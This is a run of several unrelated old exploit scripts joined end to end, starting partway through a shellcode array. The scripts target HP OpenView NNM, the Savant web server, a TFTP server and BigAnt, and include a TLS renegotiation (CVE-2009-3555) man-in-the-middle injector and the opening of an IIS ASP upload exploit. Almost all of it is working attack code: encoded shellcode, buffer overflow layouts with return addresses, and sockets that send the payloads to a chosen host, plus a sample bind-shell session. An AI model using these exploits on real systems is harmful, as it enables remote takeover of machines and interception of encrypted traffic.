"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x56\x4b\x4e"
"\x4d\x44\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x46\x4b\x48"
"\x4e\x36\x46\x52\x46\x32\x4b\x58\x45\x34\x4e\x33\x4b\x58\x4e\x57"
"\x45\x30\x4a\x37\x41\x30\x4f\x4e\x4b\x48\x4f\x44\x4a\x41\x4b\x48"
"\x4f\x55\x42\x42\x41\x30\x4b\x4e\x49\x44\x4b\x58\x46\x53\x4b\x48"
"\x41\x30\x50\x4e\x41\x53\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c"
"\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x50\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x43\x46\x45\x46\x32\x4a\x32\x45\x47\x45\x4e\x4b\x48"
"\x4f\x55\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x48\x4e\x30\x4b\x34"
"\x4b\x38\x4f\x45\x4e\x51\x41\x50\x4b\x4e\x43\x50\x4e\x32\x4b\x58"
"\x49\x48\x4e\x56\x46\x32\x4e\x41\x41\x56\x43\x4c\x41\x43\x4b\x4d"
"\x46\x56\x4b\x48\x43\x54\x42\x43\x4b\x38\x42\x44\x4e\x50\x4b\x58"
"\x42\x37\x4e\x51\x4d\x4a\x4b\x48\x42\x44\x4a\x30\x50\x45\x4a\x36"
"\x50\x58\x50\x44\x50\x30\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x46"
"\x43\x45\x48\x36\x4a\x46\x43\x43\x44\x53\x4a\x46\x47\x57\x43\x47"
"\x44\x53\x4f\x45\x46\x55\x4f\x4f\x42\x4d\x4a\x46\x4b\x4c\x4d\x4e"
"\x4e\x4f\x4b\x53\x42\x35\x4f\x4f\x48\x4d\x4f\x55\x49\x58\x45\x4e"
"\x48\x46\x41\x38\x4d\x4e\x4a\x30\x44\x50\x45\x35\x4c\x46\x44\x30"
"\x4f\x4f\x42\x4d\x4a\x56\x49\x4d\x49\x30\x45\x4f\x4d\x4a\x47\x35"
"\x4f\x4f\x48\x4d\x43\x45\x43\x35\x43\x55\x43\x35\x43\x35\x43\x34"
"\x43\x45\x43\x54\x43\x35\x4f\x4f\x42\x4d\x48\x36\x4a\x36\x41\x31"
"\x4e\x55\x48\x56\x43\x55\x49\x58\x41\x4e\x45\x39\x4a\x56\x46\x4a"
"\x4c\x51\x42\x37\x47\x4c\x47\x45\x4f\x4f\x48\x4d\x4c\x56\x42\x31"
"\x41\x55\x45\x35\x4f\x4f\x42\x4d\x4a\x46\x46\x4a\x4d\x4a\x50\x42"
"\x49\x4e\x47\x35\x4f\x4f\x48\x4d\x43\x45\x45\x45\x4f\x4f\x42\x4d"
"\x4a\x46\x45\x4e\x49\x54\x48\x48\x49\x44\x47\x35\x4f\x4f\x48\x4d"
"\x42\x45\x46\x35\x46\x45\x45\x55\x4f\x4f\x42\x4d\x43\x59\x4a\x36"
"\x47\x4e\x49\x37\x48\x4c\x49\x37\x47\x55\x4f\x4f\x48\x4d\x45\x35"
"\x4f\x4f\x42\x4d\x48\x56\x4c\x36\x46\x46\x48\x36\x4a\x36\x43\x46"
"\x4d\x56\x49\x38\x45\x4e\x4c\x36\x42\x45\x49\x45\x49\x52\x4e\x4c"
"\x49\x48\x47\x4e\x4c\x56\x46\x34\x49\x58\x44\x4e\x41\x33\x42\x4c"
"\x43\x4f\x4c\x4a\x50\x4f\x44\x44\x4d\x42\x50\x4f\x44\x34\x4e\x32"
"\x43\x49\x4d\x58\x4c\x47\x4a\x33\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x36"
"\x44\x57\x50\x4f\x43\x4b\x48\x41\x4f\x4f\x45\x47\x46\x44\x4f\x4f"
"\x48\x4d\x4b\x55\x47\x55\x44\x45\x41\x35\x41\x55\x41\x45\x4c\x56"
"\x41\x30\x41\x55\x41\x55\x45\x45\x41\x45\x4f\x4f\x42\x4d\x4a\x46"
"\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x55\x4f\x4f\x48\x4d\x4c\x36"
"\x4f\x4f\x4f\x4f\x47\x43\x4f\x4f\x42\x4d\x4b\x38\x47\x45\x4e\x4f"
"\x43\x58\x46\x4c\x46\x36\x4f\x4f\x48\x4d\x44\x45\x4f\x4f\x42\x4d"
"\x4a\x46\x4f\x4e\x50\x4c\x42\x4e\x42\x46\x43\x45\x4f\x4f\x48\x4d"
"\x4f\x4f\x42\x4d\x5a")

#9000 bytes; 7380+4+1616
#JMP ESP: 0x5A10A88B ovw.dll
#Note:  Other possible offsets to EIP we've seen:
#       [ "\x41"*7392 ] + [ EIP ] + [ junk ]
#       [ "\x41"*7332 ] + [ EIP ] + [ junk ]
buff = ("\x41"*7380+
#Compensate for varying IP lengths
"\x8b\xa8\x10\x5a"
"\xeb\x18\x90\x90"
"\x8b\xa8\x10\x5a"
"\xeb\x11\x90\x90"
"\x8b\xa8\x10\x5a"
"\xeb\x08\x90\x90"
"\x8b\xa8\x10\x5a"
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"+
shellcode+
"\xCC"*(1584-len(shellcode))
)


buffer = ("GET /OvCgi/ovalarm.exe HTTP/1.1\r\n"
"Host: 192.168.3.111\r\n"
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.5)Gecko/20091102 Firefox/3.5.5\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: en-us\r\n"
"Accept-Encoding: gzip,deflate\r\n"
"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
"Cookie: OvAcceptLang=%s; ; OVABverbose=POST\r\n"
"Cache-Control: max-age=0\r\n"
"\r\n\r\n") % buff 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 80))
print "[+] Sending evil buffer to NNMz"
s.send(buffer)
#print s.recv(1024)
s.close()
print "[+] Done!"
#!/usr/bin/python

#Title: Savant web server 3.1 buffer overflow exploit
#Author: DouBle_Zer0 
#Version: 3.1
#Tested on: win xp sp2,3 [en]
#Vulnerability discovered by Muts(offensive security)
#\x83\xc4\x50\x54\xc3 -add esp,50 push esp ret[see the double dance of this in exploit]
#ret=00401D09[pop ebp, ret]


import socket,sys
# win calc.exe [metasploit] (172 byte)
host = sys.argv[1] 
buff = ("\x31\xc9\x83\xe9\xdb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd8"
"\x22\x72\xe4\x83\xeb\xfc\xe2\xf4\x24\xca\x34\xe4\xd8\x22\xf9\xa1"
"\xe4\xa9\x0e\xe1\xa0\x23\x9d\x6f\x97\x3a\xf9\xbb\xf8\x23\x99\x07"
"\xf6\x6b\xf9\xd0\x53\x23\x9c\xd5\x18\xbb\xde\x60\x18\x56\x75\x25"
"\x12\x2f\x73\x26\x33\xd6\x49\xb0\xfc\x26\x07\x07\x53\x7d\x56\xe5"
"\x33\x44\xf9\xe8\x93\xa9\x2d\xf8\xd9\xc9\xf9\xf8\x53\x23\x99\x6d"
"\x84\x06\x76\x27\xe9\xe2\x16\x6f\x98\x12\xf7\x24\xa0\x2d\xf9\xa4"
"\xd4\xa9\x02\xf8\x75\xa9\x1a\xec\x31\x29\x72\xe4\xd8\xa9\x32\xd0"
"\xdd\x5e\x72\xe4\xd8\xa9\x1a\xd8\x87\x13\x84\x84\x8e\xc9\x7f\x8c"
"\x28\xa8\x76\xbb\xb0\xba\x8c\x6e\xd6\x75\x8d\x03\x30\xcc\x8d\x1b"
"\x27\x41\x13\x88\xbb\x0c\x17\x9c\xbd\x22\x72\xe4")
buff3 = "\x90" * 30
buff2 = "\x90" * 53
ret =   "\x09\x1D\x40" #savant.exe 
buffr = '\x83\xC4\x50\x54\xc3 /' +buff2+buff3+buff+ret + '\r\n\r\n'
print buffr
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,80))
s.send(buffr)
sys.exit()#!/usr/bin/env python
#  This vuln is already owned by Muts ,
#  but i want to add the second methode
#  Note: we don't have more space for shellcode or Skape egghunter (23 bytes only) after SEH option
# I used the jump_back because is the best and easiest way for exploiting a SEH overwrite option
#
# Reference:
# http://www.exploit-db.com/exploits/5314
#

import sys
from socket import *

if (len(sys.argv) != 2):
    print "Usage:\t%s [target]" % sys.argv[0]
    sys.exit(0)

host = sys.argv[1]
port = 69

print "TFTP SERVER Buffer Overflow remote exploit "
print "Coded By Molotov - Moroccans Hackers"

# calc
shellcode=(
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"
"\x42\x30\x42\x50\x42\x30\x4b\x48\x45\x54\x4e\x53\x4b\x38\x4e\x57"
"\x45\x30\x4a\x37\x41\x50\x4f\x4e\x4b\x38\x4f\x34\x4a\x51\x4b\x58"
"\x4f\x45\x42\x52\x41\x50\x4b\x4e\x49\x44\x4b\x48\x46\x43\x4b\x38"
"\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x49\x4e\x4a\x46\x58\x42\x4c"
"\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x33\x46\x55\x46\x32\x46\x30\x45\x37\x45\x4e\x4b\x58"
"\x4f\x45\x46\x32\x41\x30\x4b\x4e\x48\x56\x4b\x38\x4e\x30\x4b\x44"
"\x4b\x38\x4f\x55\x4e\x51\x41\x50\x4b\x4e\x4b\x48\x4e\x41\x4b\x48"
"\x41\x50\x4b\x4e\x49\x58\x4e\x35\x46\x42\x46\x30\x43\x4c\x41\x33"
"\x42\x4c\x46\x56\x4b\x58\x42\x44\x42\x43\x45\x48\x42\x4c\x4a\x37"
"\x4e\x50\x4b\x48\x42\x44\x4e\x30\x4b\x38\x42\x47\x4e\x41\x4d\x4a"
"\x4b\x38\x4a\x36\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x48\x42\x4b"
"\x42\x50\x42\x50\x42\x50\x4b\x38\x4a\x56\x4e\x33\x4f\x55\x41\x43"
"\x48\x4f\x42\x46\x48\x35\x49\x48\x4a\x4f\x43\x38\x42\x4c\x4b\x57"
"\x42\x45\x4a\x56\x50\x37\x4a\x4d\x44\x4e\x43\x37\x4a\x56\x4a\x59"
"\x50\x4f\x4c\x38\x50\x50\x47\x35\x4f\x4f\x47\x4e\x43\x56\x41\x46"
"\x4e\x56\x43\x56\x42\x30\x5a")

pad0x1 = 'A' * 400 # jumping the 0x00 monster :s
pad0x2 = 'A' * (1487 -len(shellcode)-400)
jump_back = '\xE9\xC1\xFB\xFF\xFF' # fly fly baby 
Short_jump = '\xEB\xf9\x90\x90' 
return_addr = '\x2b\x0e\x41\x00' # universal

mode = 'netascii'
payload = pad0x1 + shellcode + pad0x2 + jump_back + Short_jump + return_addr

Packet = "\x00\x02" + payload + "\0" + mode +"\0"

try:
    s = socket(AF_INET,SOCK_DGRAM)
    try:
        s.sendto(Packet, (host, port))
        print "[+] Sending the evil packet !!!"
    except:
        print "[-] send() error !"
    print "[+] Done "
except:
    print "[x] Socket() error!"
    #!/usr/bin/env python

######################################
#                                    #
#  RedTeam Pentesting GmbH           #
#  kontakt@redteam-pentesting.de     #
#  http://www.redteam-pentesting.de  #
#                                    #
######################################

# PoC exploit for the TLS renegotiation vulnerability (CVE-2009-3555)

# License
# -------
# CC-BY-SA http://creativecommons.org/licenses/by-sa/3.0/

# Timeline
# --------
# 2009-12-21 initial public release

# Known Issues
# ------------
# Firefox: if it fails connecting to a TLS site too often, falls back to
#          issuing SSLv2 ClientHello only until browser is restarted
#
# wget:    attempts SSLv2 ClientHello by default

# References
# ----------
# http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3555
# http://www.phonefactor.com/sslgap
# http://www.extendedsubset.com/
# http://www.g-sec.lu/practicaltls.pdf
# http://tools.ietf.org/html/draft-ietf-tls-renegotiation-01

import tlslite
import tlslite.api
import tlslite.messages
import tlslite.constants
import struct
import socket
import threading
import array
import sys
import optparse


if not hasattr(threading.Thread, 'name'):
    # emulate python 2.6 threading module for earlier versions
    threading.current_thread = threading.currentThread
    setattr(threading.Thread, 'name',
            property(threading.Thread.getName, threading.Thread.setName))

def forward(sock1, sock2):
    sock1.settimeout(1.0)
    while True:
        try:
            data = sock1.recv(4096)
            if not data:
                return
            sock2.send(data)
        except socket.error, ex_error:
            if ex_error[0] == 104: # Connection reset by peer
                return
        except socket.timeout, ex_timeout:
            pass


class MessageWrapper(object):
    def __init__(self, version = (3, 1), ssl2 = False):
        self.contentType = tlslite.messages.ContentType.handshake
        self.ssl2 = ssl2
        self.client_version = version

    def setType(self, type):
        self.contentType = type

    def addBytes(self, bytes):
        self.bytes = bytes

    def write(self, trial=False):
        if trial:
            raise Exception('Unsupported')
        return array.array('B', self.bytes)

def send_record(sock, msg_type, version_major, version_minor, record):
    msg = struct.pack('!BBBH', msg_type, version_major, version_minor, len(record))
    if type(record) != str:
        msg += record.tostring()
    else:
        msg += record
    sock.send(msg)

def send_encapsulated(sslsock, type, messagebytes, version = (3, 1)):
    msg = MessageWrapper(version)
    msg.addBytes(struct.unpack('B'*len(messagebytes), messagebytes))
    msg.setType(type)
    for dummy in sslsock._sendMsg(msg, True):
        pass

def decrypt_record(sslsock, type, recordbytes):
    for result in sslsock._decryptRecord(type, array.array('B', recordbytes)):
        pass
    return result

def recv_record(sock):
    try:
        header = sock.recv(5)
        if not header:
            return None, None, None, None
        msg_type, msg_version_major, msg_version_minor, msg_length = struct.unpack('!BBBH', header)
        record = ''
        while len(record) != msg_length:
            record += sock.recv(msg_length - len(record))
        return msg_type, msg_version_major, msg_version_minor, record
    except socket.error, ex:
        if ex[0] == 104: # Connection reset by peer
            return

def recv_clienthello(sock):
    header_bytes = []
    header_bytes.append(sock.recv(1))
    header_bytes[0] = struct.unpack('!B', header_bytes[0])[0]
    if header_bytes[0] & 0x80:
        # Version 2.0 Client "Record Layer"
        header_bytes.append(sock.recv(1))
        header_bytes[1] = struct.unpack('!B', header_bytes[1])[0]
        msg_length = (header_bytes[0] & 0x7f) << 8 | header_bytes[1]
        msg_version_major = 2
        msg_version_minor = 0
        msg_type = tlslite.constants.ContentType.handshake
        record = sock.recv(msg_length)
    else:
        header = sock.recv(4)
        msg_type = header_bytes[0]
        msg_version_major, msg_version_minor, msg_length = struct.unpack('!BBH', header)
        record = sock.recv(msg_length)

    return msg_type, msg_version_major, msg_version_minor, record

def send_hello_request(sock):
    sock.send("\x16"            # Record Layer: Handshake Message
             +"\x03\x01"        # Record Layer Version: TLS 1.0
             +"\x00\x04"        # Record Layer Length: 4
             +"\x00"            # Handshake Message Type: Hello Request
             +"\x00\x00\x00")   # Handshake Message Length: 0

def send_protocol_version_alert(sock):
    sock.send("\x15"            # Record Layer: Alert"
             +"\x03\x01"        # Record Layer Version: TLS 1.0
             +"\x00\x02"        # Record Layer Length: 2
             +"\x00"            # Alert Message: fatal
             +"\x46")           # Alert Message: protocol version


def handle_victim(victim, options, mitmcount):

    if options.one_shot and mitmcount != 0:
        print threading.current_thread().name, '--one-shot specified and initial connection already handled, forwarding only'
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect(options.target)
            print threading.current_thread().name, 'Connected to target %s:%u' % options.target
        except socket.error, ex:
            print threading.current_thread().name, 'Couldn\'t connect to target %s:%u' % options.target
            print threading.current_thread().name, 'Error code %u, \'%s\'' % (ex[0], ex[1])
            sys.exit(1)

        t1 = threading.Thread(target=forward, args=(sock, victim))
        t1.start()

        t2 = threading.Thread(target=forward, args=(victim, sock))
        t2.start()

        t1.join()
        sock.close()

        t2.join()
        victim.close()
        return

    # obtain initial "client hello" message
    msg_type, msg_version_major, msg_version_minor, hello_msg = recv_clienthello(victim)
    if msg_version_major == 2:
        print threading.current_thread().name, "client sent SSLv2 client hello message, exiting thread"
        return

    tls_version = (msg_version_major, msg_version_minor)
    type, length, version_major, version_minor, random, session_id_length = struct.unpack('!B3sBB32sB', hello_msg[:39])
    resume_session = (session_id_length != 0)
    if resume_session:
        print threading.current_thread().name, "client attempting to resume session"

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect(options.target)
        print threading.current_thread().name, 'Connected to target %s:%u' % options.target
    except socket.error, ex:
        print threading.current_thread().name, 'Couldn\'t connect to target %s:%u' % options.target
        print threading.current_thread().name, 'Error code %u, \'%s\'' % (ex[0], ex[1])
        sys.exit(1)


    sslsock = tlslite.api.TLSConnection(sock)
    handshake_settings = tlslite.HandshakeSettings.HandshakeSettings()
    handshake_settings.minVersion = tls_version
    handshake_settings.maxVersion = tls_version
    sslsock.handshakeClientCert(settings = handshake_settings)

    # inject prefix
    sslsock.write(options.inject)
    print threading.current_thread().name, 'Injected %s' % repr(options.inject)

    # send original "client hello" message over the encrypted channel
    send_encapsulated(sslsock, 22, hello_msg, tls_version)

    # now receive serveral TLS messages from the server, decrypt them, and forward
    # them to the client, until the server sends "server hello done"
    # these messages include "server hello", "certificate", "server key exchange",
    # unless the client is trying to resume a previous session
    print threading.current_thread().name, "about to receive server handshake messages"
    server_handshake_done = False
    while not server_handshake_done:
        msg_type, msg_version_major, msg_version_minor, result = recv_record(sslsock.sock)
        if result:
            result = decrypt_record(sslsock, msg_type, result)
            send_record(victim, msg_type, msg_version_major, msg_version_minor, result)
            if result[0] == 0x0e: # server hello done - should terminate handshake
                server_handshake_done = True
            elif resume_session and msg_type == 0x14: # change cipher spec - probably irrelevant
                server_handshake_done = True
        else:
            print threading.current_thread().name, 'receive from server failed, exiting thread'
            return
    print threading.current_thread().name, "server handshake done"


    # now its the the client's turn to send some messages, e.g.
    # "client key exchange" and "change cipher spec"
    print threading.current_thread().name, "about to receive client handshake messages"
    handshake_finished = False
    while not handshake_finished:
        msg_type, msg_version_major, msg_version_minor, record = recv_record(victim)
        print threading.current_thread().name, msg_type
        send_encapsulated(sslsock, msg_type, record, tls_version)
        if msg_type == 0x14: # change cipher spec
            handshake_finished = True

    print threading.current_thread().name, "client handshake done"

    # message after "change cipher spec" must be sent in the "clear"
    msg_type, msg_version_major, msg_version_minor, record = recv_record(victim)
    send_record(sslsock.sock, msg_type, msg_version_major, msg_version_minor, record)

    # server should now send "change cipher spec" message, we decrypt and send that to the victim
    msg_type, msg_version_major, msg_version_minor, record = recv_record(sslsock.sock)
    result = decrypt_record(sslsock, msg_type, record)
    send_record(victim, msg_type, msg_version_major, msg_version_minor, result)

    # finalize handshake
    msg_type, msg_version_major, msg_version_minor, record = recv_record(sslsock.sock)
    if record:
        send_record(victim, msg_type, msg_version_major, msg_version_minor, record)
    else:
        sslsock.sock.close()
        victim.close()
        del sslsock
        return



    # the rest is just forwarding TLS records between both parties,
    # which we cannot interfere with anymore, apart from dropping server
    # responses
    if options.drop:
        sslsock.sock.close()
        del sslsock
    else:
        t1 = threading.Thread(target=forward, args=(sslsock.sock, victim))
        t1.start()

    t2 = threading.Thread(target=forward, args=(victim, sslsock.sock))
    t2.start()

    if not options.drop:
        t1.join()
        sslsock.sock.close()

    t2.join()
    victim.close()



if __name__ == "__main__":
    parser = optparse.OptionParser()
    parser.add_option('-l', '--listen', dest='listen_port', help='port to listen on', metavar='PORT', type='int', default=8443)
    parser.add_option('-b', '--bind', dest='bind_address', help='address to bind to', metavar='ADDRESS', default='0.0.0.0')
    parser.add_option('-t', '--target', dest='target', help='host and port to connect to', metavar='HOST:PORT' )
    parser.add_option('-i', '--inject', dest='inject', help='string to inject', metavar='DATA')
    parser.add_option('', '--inject-file', dest='inject_file', help='inject data from a file', metavar='FILE')
    parser.add_option('', '--inject-base64', dest='inject_base64', help='string to inject, base64-encoded', metavar='DATA')
    parser.add_option('-o', '--one-shot', dest='one_shot', action='store_true', help='only mitm the first connection attempt, forward all other connections')
    parser.add_option('-d', '--drop-responses', dest='drop', action="store_true", default=False, help='drop server responses after renegotiating')

    (options, args) = parser.parse_args()

    if len([i for i in (options.inject, options.inject_file, options.inject_base64) if i]) != 1:
        print 'Exactly one injection option must be specified'
        sys.exit(1)

    if options.inject_file:
        try:
            options.inject = open(options.inject_file, 'r').read()
        except IOError, ex:
            print ex
            sys.exit(1)

    if options.inject_base64:
        import base64
        try:
            options.inject = base64.decodestring(options.inject_base64)
        except base64.binascii.Error, ex:
            print 'Error decoding base64 data: %s' % ex
            sys.exit(1)


    if not options.listen_port or \
       not options.bind_address or \
       not options.target or \
       not options.inject:
        parser.print_help()
        sys.exit(1)

    target = options.target.split(':')
    if len(target)==2:
        try:
            target[1] = int(target[1])
        except ValueError:
            target[1] = None
    if len(target)!=2 or not target[0] or not target[1]:
        print 'Target \'%s\' not in format HOST:PORT' % options.target
        sys.exit(1)

    options.target = tuple(target)

    try:
        listensocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listensocket.bind((options.bind_address, options.listen_port))
        print 'Listening on %s:%u' % (options.bind_address, options.listen_port)
    except socket.error, ex:
        print 'Couldn\'t listen on %s:%u' % (options.bind_address, options.listen_port)
        print 'Error code %u, \'%s\'' % (ex[0], ex[1])
        sys.exit(1)

    listensocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listensocket.listen(5)

    mitmcount = 0

    while True:
        try:
            victim, victimaddr = listensocket.accept()
            print 'New connection from %s:%u' % victimaddr

            threading.Thread(target=handle_victim, args=(victim, options, mitmcount)).start()
            mitmcount += 1

        except KeyboardInterrupt, ex:
            print '\nAborted by user, exiting...'
            listensocket.close()
            sys.exit(1)

#!/usr/bin/python
import socket, sys

#########################
#BigAnt version 2.52 0day
#Tested on XPSP2 & Win2k3 SP2
#Discovered by Lincoln
#Thanks to muts & remote-exploit
#
#650 or so bytes available after seh, easier to jump back
#
#root@BT4VM:~# ./bigant.py 192.168.87.130
#Exploit sent! Connect to remote host on port 4444
#
#root@BT4VM:~# nc -vn 192.168.87.130 4444
#(UNKNOWN) [192.168.87.130] 4444 (?) open
#Microsoft Windows XP [Version 5.1.2600]
#(C) Copyright 1985-2001 Microsoft Corp.
#
#C:\WINDOWS\system32>
#########################


#[*] Using Msf::Encoder::PexAlphaNum with final size of 709 bytes
sc = ("\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x46\x4b\x4e"
"\x4d\x54\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x46\x4b\x48"
"\x4e\x46\x46\x32\x46\x42\x4b\x58\x45\x34\x4e\x43\x4b\x38\x4e\x37"
"\x45\x50\x4a\x37\x41\x30\x4f\x4e\x4b\x58\x4f\x34\x4a\x31\x4b\x48"
"\x4f\x35\x42\x52\x41\x50\x4b\x4e\x49\x34\x4b\x38\x46\x53\x4b\x38"
"\x41\x30\x50\x4e\x41\x53\x42\x4c\x49\x39\x4e\x4a\x46\x38\x42\x4c"
"\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x33\x46\x35\x46\x42\x4a\x42\x45\x37\x45\x4e\x4b\x58"
"\x4f\x45\x46\x32\x41\x50\x4b\x4e\x48\x56\x4b\x58\x4e\x30\x4b\x54"
"\x4b\x58\x4f\x35\x4e\x51\x41\x30\x4b\x4e\x43\x50\x4e\x52\x4b\x38"
"\x49\x58\x4e\x56\x46\x42\x4e\x41\x41\x46\x43\x4c\x41\x33\x4b\x4d"
"\x46\x56\x4b\x38\x43\x44\x42\x33\x4b\x48\x42\x54\x4e\x30\x4b\x48"
"\x42\x57\x4e\x31\x4d\x4a\x4b\x38\x42\x34\x4a\x30\x50\x35\x4a\x36"
"\x50\x48\x50\x44\x50\x50\x4e\x4e\x42\x55\x4f\x4f\x48\x4d\x48\x56"
"\x43\x55\x48\x46\x4a\x46\x43\x53\x44\x43\x4a\x36\x47\x37\x43\x47"
"\x44\x33\x4f\x35\x46\x35\x4f\x4f\x42\x4d\x4a\x36\x4b\x4c\x4d\x4e"
"\x4e\x4f\x4b\x53\x42\x55\x4f\x4f\x48\x4d\x4f\x55\x49\x48\x45\x4e"
"\x48\x56\x41\x58\x4d\x4e\x4a\x50\x44\x50\x45\x35\x4c\x46\x44\x30"
"\x4f\x4f\x42\x4d\x4a\x46\x49\x4d\x49\x30\x45\x4f\x4d\x4a\x47\x45"
"\x4f\x4f\x48\x4d\x43\x35\x43\x45\x43\x35\x43\x55\x43\x55\x43\x34"
"\x43\x45\x43\x34\x43\x55\x4f\x4f\x42\x4d\x48\x56\x4a\x46\x41\x41"
"\x4e\x45\x48\x36\x43\x55\x49\x38\x41\x4e\x45\x59\x4a\x46\x46\x4a"
"\x4c\x41\x42\x57\x47\x4c\x47\x35\x4f\x4f\x48\x4d\x4c\x56\x42\x41"
"\x41\x55\x45\x55\x4f\x4f\x42\x4d\x4a\x46\x46\x4a\x4d\x4a\x50\x52"
"\x49\x4e\x47\x45\x4f\x4f\x48\x4d\x43\x35\x45\x45\x4f\x4f\x42\x4d"
"\x4a\x36\x45\x4e\x49\x44\x48\x48\x49\x44\x47\x45\x4f\x4f\x48\x4d"
"\x42\x35\x46\x35\x46\x45\x45\x45\x4f\x4f\x42\x4d\x43\x59\x4a\x56"
"\x47\x4e\x49\x37\x48\x4c\x49\x37\x47\x45\x4f\x4f\x48\x4d\x45\x35"
"\x4f\x4f\x42\x4d\x48\x56\x4c\x56\x46\x36\x48\x36\x4a\x36\x43\x56"
"\x4d\x56\x49\x58\x45\x4e\x4c\x36\x42\x35\x49\x45\x49\x52\x4e\x4c"
"\x49\x58\x47\x4e\x4c\x36\x46\x34\x49\x38\x44\x4e\x41\x43\x42\x4c"
"\x43\x4f\x4c\x4a\x50\x4f\x44\x34\x4d\x52\x50\x4f\x44\x54\x4e\x32"
"\x43\x49\x4d\x58\x4c\x57\x4a\x43\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x46"
"\x44\x47\x50\x4f\x43\x4b\x48\x31\x4f\x4f\x45\x57\x46\x44\x4f\x4f"
"\x48\x4d\x4b\x55\x47\x45\x44\x45\x41\x45\x41\x35\x41\x55\x4c\x36"
"\x41\x30\x41\x45\x41\x45\x45\x35\x41\x35\x4f\x4f\x42\x4d\x4a\x46"
"\x4d\x4a\x49\x4d\x45\x50\x50\x4c\x43\x45\x4f\x4f\x48\x4d\x4c\x46"
"\x4f\x4f\x4f\x4f\x47\x53\x4f\x4f\x42\x4d\x4b\x38\x47\x55\x4e\x4f"
"\x43\x48\x46\x4c\x46\x46\x4f\x4f\x48\x4d\x44\x55\x4f\x4f\x42\x4d"
"\x4a\x46\x42\x4f\x4c\x58\x46\x50\x4f\x45\x43\x55\x4f\x4f\x48\x4d"
"\x4f\x4f\x42\x4d\x5a")

host = sys.argv[1]

# p/p/r from vbajet32.dll
buffer = "\x90" * 218  + sc + "\x90" * 35 + "\xeb\x06\x90\x90" + "\x95\x32\x9a\x0f"
buffer += "\x90" * 10 + "\xe9\x7c\xfc\xff\xff" + "\x90" * 650

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, 6660)) #hardcoded default port
s.send("USV " + buffer + "\r\n\r\n")
print "Exploit sent! Connect to remote host on port 4444\n"
s.close()

#!/usr/bin/python
#
# Exploit Title: Exploit for Microsoft IIS ASP Multiple Extensions Security Bypass 5.x/6.x
# Date: 29 dec 2009
# Author: Emanuele 'emgent' Gentili and Emanuele 'crossbower' Acri
# Software Link: N/A
# Version: IIS 5.x/6.x
# Tested on: Windows 2003 Server SP2
# CVE : N/A
# Code : http://www.backtrack.it/~emgent/exploits/IIS-asp.py 
# Special greetz. Carlo Velletri (brigante@backtrack.it)
#
# Vulnerability Description:
# The Vulnerability discovered in Microsoft Internet Information Services (IIS) can be exploited by malicious people to potentially bypass
# certain security restrictions and compromise a vulnerable system.
# The vulnerability is caused due to the web server incorrectly executing e.g. ASP code included in a file having multiple extensions separated
# by ";", if the first extension is equal to ".asp" (e.g. "file.asp;.jpg"). 
# This can be exploited to potentially upload and execute arbitrary ASP code via a third-party application using file extensions to restrict 
# uploaded file types.
#
# Exploit Descrition:
# This is a simple malicious file creator, that will help the users to create jpg images with metasploit shellcode.
# After that for exploit the IIS 5.x/6.x issue, the user must browse the file uploaded for running exploit code.
# Bindshell on port 31337 will be created, so use your netcat properly ;)
#
# Exploit Usage Demo:
# root@enJoy:/tmp# ./IIS-asp.py
# Exploit for Microsoft IIS ASP Multiple Extensions Security Bypass 5.x/6.x
